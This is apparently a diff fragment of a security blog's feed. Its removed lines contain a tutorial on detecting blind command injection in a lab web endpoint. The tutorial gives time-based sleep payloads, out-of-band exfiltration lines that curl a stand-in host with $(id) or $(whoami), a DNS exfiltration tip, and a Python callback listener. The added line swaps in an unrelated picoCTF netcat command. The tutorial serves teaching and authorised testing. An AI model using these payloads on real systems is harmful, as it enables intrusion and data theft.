-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-whoami &gt; /tmp/output.txt
-</code></pre>
-</div>
-
-<p>Then attempt to read it:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-cat /tmp/output.txt
-</code></pre>
-</div>
-
-<p>This requires multiple steps and possibly multiple injection points, but if you pull it off it’s a solid confirm.</p>
-
-<hr />
-
-<h2 id="the-curl-trick">The Curl Trick</h2>
-
-<p><code class="language-plaintext highlighter-rouge">curl</code> is the Swiss Army knife of testing. Use it to exfil data, confirm execution, or verify external command execution.</p>
-
-<p>Example payload:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-curl http://yourhost.com?data=$(id)
-</code></pre>
-</div>
-
-<p>If you log the inbound request and see the system’s UID info? You just lit up their internals.</p>
-
-<hr />
-
-<h2 id="final-thoughts">Final Thoughts</h2>
-
-<p>Blind command injection is about patience, observation, and precision. You’re not shooting bullets you’re setting traps. Always consider the OS, encoding quirks, filters, and how input is parsed.</p>
-
-<p>In the field? Don’t just fire payloads. Read the system. Observe delays. Monitor DNS logs. Force OOB callbacks.</p>
-
-<h1 id="blind-command-injection-in-action">Blind Command Injection in Action</h1>
-
-<p>Let’s break down a live scenario.</p>
-
-<p>We’re working with a vulnerable endpoint:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*grndEgT4mupOjNQIl9qPWw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>At first glance, it just pulls a template based on the <code class="language-plaintext highlighter-rouge">file</code> parameter.</p>
-
-<hr />
-
-<h4 id="initial-test-verbose-attempt">Initial Test Verbose Attempt</h4>
-
-<p>We try to inject a simple system command:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1;%20pwd
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0v77pl16YzMQL0mCrGpWFA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>The app responds:</p>
-
-<div class="alert-error">
-[!] Template not found: invoice1; pwd`
-</div>
-
-<p><strong>What this tells us:</strong>
-The input was executed or parsed, but we’re not seeing command output looks like it’s treating everything after <code class="language-plaintext highlighter-rouge">;</code> as part of the filename. So far, no solid confirmation of execution.</p>
-
-<hr />
-
-<h4 id="pivot-to-blind-injection">Pivot to Blind Injection</h4>
-
-<p>Now we go stealth: <strong>time-based testing</strong>.</p>
-
-<p>We craft this payload:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1;%20sleep%205
-</code></pre>
-</div>
-
-<p><strong>Result:</strong>
-The page takes ~5 seconds to respond. That’s suspicious.</p>
-
-<p>To confirm, we bump it up:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1;%20sleep%2010
-</code></pre>
-</div>
-
-<p><strong>Now it takes 10 seconds.</strong></p>
-
-<p><strong>Bingo.</strong> That delay is our echo in the void. We’re executing commands we’re just blind to the output.</p>
-
-<hr />
-
-<h4 id="visual-proof-gifscreenshot">Visual Proof (GIF/Screenshot)</h4>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_5R3d3TmgaQ4Cp192pe85w.gif" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Visuals here reinforce what’s happening. The delay is tied to our payload. That’s how we <strong>detect blind command injection</strong>  by controlling time, not output.</p>
-
-<h1 id="out-of-band-oob-command-injection-detection">Out-of-Band (OOB) Command Injection Detection</h1>
-<hr />
-
-<p>Blind injection isn’t always about watching timeouts. Sometimes, the system talks <strong>just not to you</strong>. So we make it talk to <strong>us</strong>.</p>
-
-<p>We use <strong>OOB detection</strong> to catch these silent payloads by watching for outbound requests triggered by the app.</p>
-
-<hr />
-
-<h3 id="scenario-setup">Scenario Setup</h3>
-
-<p>Same target:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*grndEgT4mupOjNQIl9qPWw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>We want to test if this endpoint lets us execute system-level commands even if we get no visual output.</p>
-
-<hr />
-
-<h3 id="step-1-set-up-a-listener">Step 1: Set Up a Listener</h3>
-
-<p>We spin up a minimal Python HTTP server to catch any outbound callbacks triggered by tools like <code class="language-plaintext highlighter-rouge">curl</code>, <code class="language-plaintext highlighter-rouge">wget</code>, or even DNS requests.</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">Python</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-python">
-# oob_listener.py
-from http.server import BaseHTTPRequestHandler, HTTPServer
-import logging
-
-class TrapHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        logging.info(f"OOB GET request: {self.path}")
-        print(f"[+] Caught request from {self.client_address[0]} | PATH: {self.path}")
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b'ACK')
-
-if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO)
-    server = HTTPServer(('0.0.0.0', 80), TrapHandler)
-    print("[*] Listening for incoming OOB requests on port 80...")
-    server.serve_forever()
-</code></pre>
-</div>
-
-<p><strong>Goal</strong>: Catch any network beacon from the target that hits this listener.</p>
-
-<hr />
-
-<h3 id="step-2-trigger-the-payload">Step 2: Trigger the Payload</h3>
-
-<p>Now that our trap is live, we inject this into the vulnerable URL:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1; sleep 5; curl http://10.0.2.15/$(whoami)
-</code></pre>
-</div>
-
-<p>Or:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1; sleep 5; curl http://10.0.2.15/$(pwd)
-</code></pre>
-</div>
-
-<p><strong>Watch the console</strong> if the app executes our command, it will leak the output (<code class="language-plaintext highlighter-rouge">whoami</code>, <code class="language-plaintext highlighter-rouge">pwd</code>, etc.) into the URL path and hit our trap server.</p>
-
-<hr />
-
-<h3 id="step-3-confirm-execution">Step 3: Confirm Execution</h3>
-
-<p>Your listener should output something like:</p>
-
-<p><code class="language-plaintext highlighter-rouge">[+] Caught request from 10.0.2.12 | PATH: /root</code></p>
-
-<p>That means your payload got executed, the app reached out to your server, and it returned the result of <code class="language-plaintext highlighter-rouge">$(whoami)</code> or <code class="language-plaintext highlighter-rouge">$(pwd)</code>.</p>
-
-<p><strong>command execution confirmed via OOB</strong>.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OyWoFZy4uaRWq_sMjEghNw.gif" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<hr />
-
-<h3 id="why-this-works">Why This Works</h3>
-
-<p>Most apps don’t restrict outbound traffic. So if you can’t see the result on the frontend, you make the backend deliver the result to your own server. It’s like putting a mic on the enemy comms.</p>
-
-<hr />
-
-<h3 id="pro-tips">Pro Tips</h3>
-
-<ul>
-  <li>
-    <p>Use tools like <strong>Burp Collaborator</strong>, <strong>RequestBin</strong>, or your own <strong>DNS/HTTP listener</strong>.</p>
-  </li>
-  <li>
-    <p>Want stealth? Use DNS-based callbacks: <code class="language-plaintext highlighter-rouge">dig $(whoami).yourdomain.com</code></p>
-  </li>
-  <li>
-    <p>OOB is king when you’re behind WAFs, filtered output, or sandboxed environments.</p>
-  </li>
-</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[What if a single line of input could give an attacker full control over a system? No passwords. No exploits. Just raw commands slipped in through the cracks. That’s the threat behind Command Injection one of the most dangerous, yet often overlooked, vulnerabilities in modern applications.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e1.pxfuel.com/desktop-wallpaper/92/1012/desktop-wallpaper-spooky-creepy-evil-backgrounds-scary-horror-dark-evil-background.jpg" /><media:content medium="image" url="https://e1.pxfuel.com/desktop-wallpaper/92/1012/desktop-wallpaper-spooky-creepy-evil-backgrounds-scary-horror-dark-evil-background.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p>Remember to save the output like this: <code class="language-plaintext highlighter-rouge">nc verbal-sleep[.]picoctf[.]net 63518 &gt; scrambled_output.txt</code></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><category term="Reverse Engineering" /><summary type="html"><![CDATA[Reverse Engineering a Recursive Scramble in Python picoCTF Challenge Breakdown]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e1.pxfuel.com/desktop-wallpaper/637/928/desktop-wallpaper-the-grim-reaper-%C2%B7%E2%91%A0-grim-reaper-layouts-backgrounds.jpg" /><media:content medium="image" url="https://e1.pxfuel.com/desktop-wallpaper/637/928/desktop-wallpaper-the-grim-reaper-%C2%B7%E2%91%A0-grim-reaper-layouts-backgrounds.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
